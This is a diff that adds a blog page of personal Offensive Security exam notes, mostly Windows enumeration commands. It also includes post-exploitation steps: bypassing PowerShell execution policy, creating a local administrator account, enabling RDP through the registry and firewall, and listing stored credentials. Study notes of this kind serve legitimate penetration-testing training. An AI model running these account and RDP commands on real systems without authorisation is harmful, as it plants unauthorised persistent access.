@@ -1,0 +1,717 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>My Notes | 0xbirb</title><meta name="author" content="Ludwig Schober,schober.ludwig@protonmail.com"><meta name="copyright" content="Ludwig Schober"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Notes for the Offensive Security Exam.. Enumeration Windows Enum  Script Execution 123#bypass powershell default restriction, might alert avpowershell.exe -ep bypasspowershell.exe -noprofile -ep bypas">
+<meta property="og:type" content="article">
+<meta property="og:title" content="My Notes">
+<meta property="og:url" content="https://0xbirb.github.io/2024/05/23/2024-05-25-my-notes/index.html">
+<meta property="og:site_name" content="0xbirb">
+<meta property="og:description" content="Notes for the Offensive Security Exam.. Enumeration Windows Enum  Script Execution 123#bypass powershell default restriction, might alert avpowershell.exe -ep bypasspowershell.exe -noprofile -ep bypas">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/0xbirb/0xbirb.github.io/main/img/logo.png">
+<meta property="article:published_time" content="2024-05-23T05:00:00.000Z">
+<meta property="article:modified_time" content="2024-11-30T14:32:51.000Z">
+<meta property="article:author" content="Ludwig Schober">
+<meta property="article:tag" content="notes">
+<meta property="article:tag" content="enumeration">
+<meta property="article:tag" content="shells">
+<meta property="article:tag" content="exploitation">
+<meta property="article:tag" content="privsec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/0xbirb/0xbirb.github.io/main/img/logo.png"><link rel="shortcut icon" href="https://raw.githubusercontent.com/0xbirb/0xbirb.github.io/main/img/favicon.png"><link rel="canonical" href="https://0xbirb.github.io/2024/05/23/2024-05-25-my-notes/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.2.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"Author: Ludwig Schober","link":"Link: ","source":"Source: 0xbirb","info":"Copyright belongs to the author. For commercial use, please contact the author for authorization. For non-commercial use, please indicate the source."}},
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'My Notes',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://raw.githubusercontent.com/0xbirb/0xbirb.github.io/main/img/logo.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">10</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/2024/04/23/2024-05-25-introduction-to-this-blog"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: linear-gradient(25deg,#0047ab,#7b4dbb,#d94f70,#ff1744);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://raw.githubusercontent.com/0xbirb/0xbirb.github.io/main/img/logo.png" alt="Logo"><span class="site-name">0xbirb</span></a><a class="nav-page-title" href="/"><span class="site-name">My Notes</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/2024/04/23/2024-05-25-introduction-to-this-blog"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">My Notes</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-05-23T05:00:00.000Z" title="Created 2024-05-23 07:00:00">2024-05-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-30T14:32:51.000Z" title="Updated 2024-11-30 15:32:51">2024-11-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Notes/">Notes</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Notes/File-Transfers/">File Transfers</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Notes/File-Transfers/Privilege-Escalation/">Privilege Escalation</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Notes/File-Transfers/Privilege-Escalation/Shells/">Shells</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Notes/File-Transfers/Privilege-Escalation/Shells/Exploit/">Exploit</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>Notes for the Offensive Security Exam..</p>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><hr>
+<h3 id="Windows-Enum"><a href="#Windows-Enum" class="headerlink" title="Windows Enum"></a><strong>Windows Enum</strong></h3><br>
+
+<h4 id="Script-Execution"><a href="#Script-Execution" class="headerlink" title="Script Execution"></a>Script Execution</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#bypass powershell default restriction, might alert av</span></span><br><span class="line">powershell.exe <span class="literal">-ep</span> bypass</span><br><span class="line">powershell.exe <span class="literal">-noprofile</span> <span class="literal">-ep</span> bypass <span class="operator">-file</span> .\find.ps1</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="Usernames-and-Groups"><a href="#Usernames-and-Groups" class="headerlink" title="Usernames and Groups"></a>Usernames and Groups</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#get local users ps</span></span><br><span class="line"><span class="built_in">Get-LocalUser</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get local user cmd</span></span><br><span class="line">net users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#get local group ps</span></span><br><span class="line"><span class="built_in">Get-LocalGroup</span></span><br><span class="line"><span class="built_in">Get-LocalGroupMember</span> <span class="string">&quot;Administrators&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get local group cmd</span></span><br><span class="line">net localgroup</span><br><span class="line">net localgroup Administrators</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>Enumerate groups and memberships</em></li>
+</ul>
+<br>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create a new user</span></span><br><span class="line">net user foo password /add</span><br><span class="line">net localgroup Administrators foo /add</span><br><span class="line"></span><br><span class="line"><span class="comment"># add new user to rdp group</span></span><br><span class="line"><span class="built_in">Add-LocalGroupMember</span> <span class="literal">-Group</span> <span class="string">&quot;Remote Desktop Users&quot;</span> <span class="literal">-Member</span> foo</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>Create users and add to group</em></li>
+</ul>
+<br>
+
+<h4 id="Privileges"><a href="#Privileges" class="headerlink" title="Privileges"></a>Privileges</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami /all</span><br><span class="line">whoami /priv</span><br><span class="line">whoami /groups</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="Run-As"><a href="#Run-As" class="headerlink" title="Run As"></a>Run As</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># interactice</span></span><br><span class="line">runas.exe /user:domain\Administrator <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br><span class="line">runas.exe /netonly /user:domain\Administrator <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#start as an admin</span></span><br><span class="line"><span class="built_in">start-process</span> PowerShell <span class="literal">-verb</span> runas</span><br><span class="line"></span><br><span class="line">runas.exe /user:domain\Administrator /savecred <span class="string">&quot;C:\Windows\System32\cmd.exe /c whoami&quot;</span></span><br><span class="line">Login<span class="literal">-User</span> <span class="literal">-Identity</span> <span class="string">&quot;corp\foo&quot;</span> <span class="literal">-Password</span> <span class="string">&quot;Str0ngP4ssw0rd@123&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#runas cmd</span></span><br><span class="line">runas /user:admin cmd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>Run as different user</em></li>
+</ul>
+<br>
+
+<h4 id="Credentials"><a href="#Credentials" class="headerlink" title="Credentials"></a>Credentials</h4><hr>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># list local creds cmd</span></span><br><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://pscustomobject.github.io/powershell/howto/PowerShell-Create-Credential-Object/">Cheat-Sheet</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#store creds inside $cred variable</span></span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">get-credential</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">#enter credential in the pop-up window</span></span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> mycomputer <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">Get-ChildItem</span> C:\ &#125; <span class="literal">-credential</span> <span class="variable">$cred</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cred</span>.GetNetworkCredential()|<span class="built_in">fl</span> * to retrieve the username and password</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="Architecture-and-System"><a href="#Architecture-and-System" class="headerlink" title="Architecture and System"></a>Architecture and System</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line"><span class="built_in">echo</span> %PROCESSOR_ARCHITECTURE%</span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span> /C:<span class="string">&quot;System Type&quot;</span></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;Host Name&quot;</span> /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span> /C:<span class="string">&quot;System Type&quot;</span> /C:<span class="string">&quot;Network Card(s)&quot;</span> /C:<span class="string">&quot;Hotfix(s)&quot;</span> /C:<span class="string">&quot;Domain&quot;</span></span><br><span class="line"></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;Betriebssystemname&quot;</span> /C:<span class="string">&quot;Betriebssystemversion&quot;</span> /C:<span class="string">&quot;Systemtyp&quot;</span></span><br><span class="line"></span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;Host Name&quot;</span> /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span> /C:<span class="string">&quot;System Type&quot;</span> /C:<span class="string">&quot;Network Card(s)&quot;</span> /C:<span class="string">&quot;Hotfix(s)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>enumerate system-info</em></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">System.Environment</span>]::OSVersion.Version</span><br><span class="line">(<span class="built_in">Get-CimInstance</span> Win32_OperatingSystem).version</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>Get Build Version</em></li>
+</ul>
+<br>
+
+<h4 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#List network interfaces</span></span><br><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line"><span class="comment">#display routing table </span></span><br><span class="line">route print</span><br><span class="line"></span><br><span class="line"><span class="comment">#Active network connections on the client</span></span><br><span class="line">netstat <span class="literal">-ano</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>Information about the network configuration</em></li>
+</ul>
+<br>
+
+<h4 id="Software-and-Processes"><a href="#Software-and-Processes" class="headerlink" title="Software and Processes"></a>Software and Processes</h4><hr>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ItemProperty</span> <span class="string">&quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot;</span> | <span class="built_in">select</span> displayname</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>Installed applications on the client</em></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># list processes</span></span><br><span class="line"><span class="built_in">get-process</span> <span class="literal">-IncludeUserName</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get processes related to a service</span></span><br><span class="line">tasklist /SVC</span><br><span class="line"></span><br><span class="line"><span class="comment"># kill process</span></span><br><span class="line">taskkill /f powershell.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># get all process members</span></span><br><span class="line"><span class="built_in">Get-Process</span> | <span class="built_in">Get-Member</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cleaned output</span></span><br><span class="line"><span class="built_in">Get-Process</span> <span class="literal">-IncludeUserName</span> | <span class="built_in">select</span> Path, Name, Description</span><br><span class="line"></span><br><span class="line"><span class="comment"># get command lines processes</span></span><br><span class="line">gcim win32_process | <span class="built_in">select</span> path, commandline</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>Interact with processes</em></li>
+</ul>
+<br>
+
+
+<h4 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask">https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ScheduledTask</span></span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment"># filter to user tasks</span></span><br><span class="line"><span class="built_in">Get-ScheduledTask</span> <span class="literal">-TaskPath</span> <span class="string">&quot;\Users\*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Get-ScheduledTaskInfo</span></span><br><span class="line"><span class="built_in">Get-ScheduledTaskInfo</span> <span class="literal">-TaskName</span> &lt;Full Path&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># list task based on a file</span></span><br><span class="line">schtasks /query /fo LIST /v | <span class="built_in">Select-String</span> <span class="string">&quot;backup.exe&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>get schedules task, query for backup.exe</em></li>
+</ul>
+<br>
+
+<h4 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://mcpmag.com/articles/2014/12/12/service-information-using-powershell.aspx">https://mcpmag.com/articles/2014/12/12/service-information-using-powershell.aspx</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># via sc</span></span><br><span class="line"><span class="built_in">sc</span> query <span class="built_in">type</span>= service state= <span class="string">&quot;Running&quot;</span></span><br><span class="line"><span class="built_in">sc</span> queryex <span class="built_in">type</span>= service</span><br><span class="line"><span class="built_in">sc</span> query state= all | find <span class="string">&quot;SERVICE_NAME&quot;</span></span><br><span class="line"><span class="built_in">sc</span> query <span class="string">&quot;Service Name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># check windows defender</span></span><br><span class="line"><span class="built_in">sc</span> query windefend</span><br><span class="line"></span><br><span class="line"><span class="comment">#powershell</span></span><br><span class="line"><span class="built_in">Get-Service</span></span><br><span class="line"><span class="built_in">Get-Service</span> <span class="literal">-Name</span> WinRM | <span class="built_in">Select-Object</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#get running services</span></span><br><span class="line"><span class="built_in">Get-CimInstance</span> <span class="literal">-ClassName</span> win32_service | <span class="built_in">Select</span> Name,State,PathName | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.State <span class="operator">-like</span> <span class="string">&#x27;Running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#powershell (old only)</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> win32_service | <span class="built_in">Select-Object</span> Name, State, PathName | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.State <span class="operator">-like</span> <span class="string">&#x27;Running&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># list service based on a file</span></span><br><span class="line">wmic service list | <span class="built_in">Select-String</span> <span class="string">&quot;backup.exe&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>list currently running services, search for a specific service</em></li>
+</ul>
+<br>
+
+<h4 id="SMB-Shares"><a href="#SMB-Shares" class="headerlink" title="SMB Shares"></a>SMB Shares</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-SmbShareAccess</span> </span><br><span class="line"><span class="built_in">Get-SMBShare</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>get smb-shares in the network</em></li>
+</ul>
+<br>
+
+<h4 id="SNMP-161"><a href="#SNMP-161" class="headerlink" title="SNMP 161"></a>SNMP 161</h4><ul>
+<li>Enumerate the version of the service. It runs on SNMP and requires sudo to scan <code>sudo nmap -p 161 -sV &lt;IP&gt;</code></li>
+<li>Try <code>snmpwalk</code> on the service and get all info about MIBs, check known MIBs (users, installed programs etc..)</li>
+<li>Try to get more information enumerating <code>NET-SNMP-EXTEND-MIB::nsExtendOutputFull</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#enum public information from snmp</span></span><br><span class="line">snmpwalk -c public -v1 -t 10.10.10.10 NET-SNMP-EXTEND-MIB::nsExtendOutputFull</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">Cheat-Sheet </a></p>
+<br>
+
+
+<h4 id="Remote-Desktop"><a href="#Remote-Desktop" class="headerlink" title="Remote Desktop"></a>Remote Desktop</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># check if enablesd</span></span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&#x27;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\&#x27;</span></span><br><span class="line"><span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># set</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot;</span> <span class="literal">-Name</span> <span class="string">&quot;fDenyTSConnections&quot;</span> <span class="literal">-Value</span> <span class="number">0</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot;</span> <span class="literal">-Name</span> <span class="string">&quot;AllowRemoteRPC&quot;</span> <span class="literal">-Value</span> <span class="number">1</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&quot;</span> <span class="literal">-Name</span> <span class="string">&quot;UserAuthentication&quot;</span> <span class="literal">-Value</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open firewall</span></span><br><span class="line"><span class="built_in">Enable-NetFirewallRule</span> <span class="literal">-DisplayGroup</span> <span class="string">&quot;Remote Desktop&quot;</span></span><br><span class="line">netsh advfirewall firewall <span class="built_in">set</span> rule <span class="built_in">group</span>=<span class="string">&quot;remote desktop&quot;</span> new enable=yes</span><br><span class="line"></span><br><span class="line"><span class="comment"># add users to the group</span></span><br><span class="line"><span class="built_in">Add-LocalGroupMember</span> <span class="literal">-Group</span> <span class="string">&quot;Remote Desktop Users&quot;</span> <span class="literal">-Member</span> foo</span><br><span class="line">net localgroup <span class="string">&quot;Remote Desktop Users&quot;</span> foo /add</span><br><span class="line"></span><br><span class="line"><span class="comment"># add user foo &amp; to local admin</span></span><br><span class="line">net user add foo fooPa<span class="variable">$</span><span class="variable">$</span>! /add</span><br><span class="line">net localgroup <span class="string">&quot;Administrators&quot;</span> foo /add</span><br><span class="line"></span><br><span class="line"><span class="comment">#restart rdp</span></span><br><span class="line"><span class="built_in">Restart-Service</span> <span class="literal">-Force</span> <span class="literal">-Name</span> <span class="string">&quot;TermService&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>enable RDP via registry</em></li>
+<li><em>adjust windows firewall</em></li>
+<li><em>add member to remote desktop users group</em></li>
+</ul>
+<br>
+
+<h4 id="Search-for-interesting-files"><a href="#Search-for-interesting-files" class="headerlink" title="Search for interesting files"></a>Search for interesting files</h4><hr>
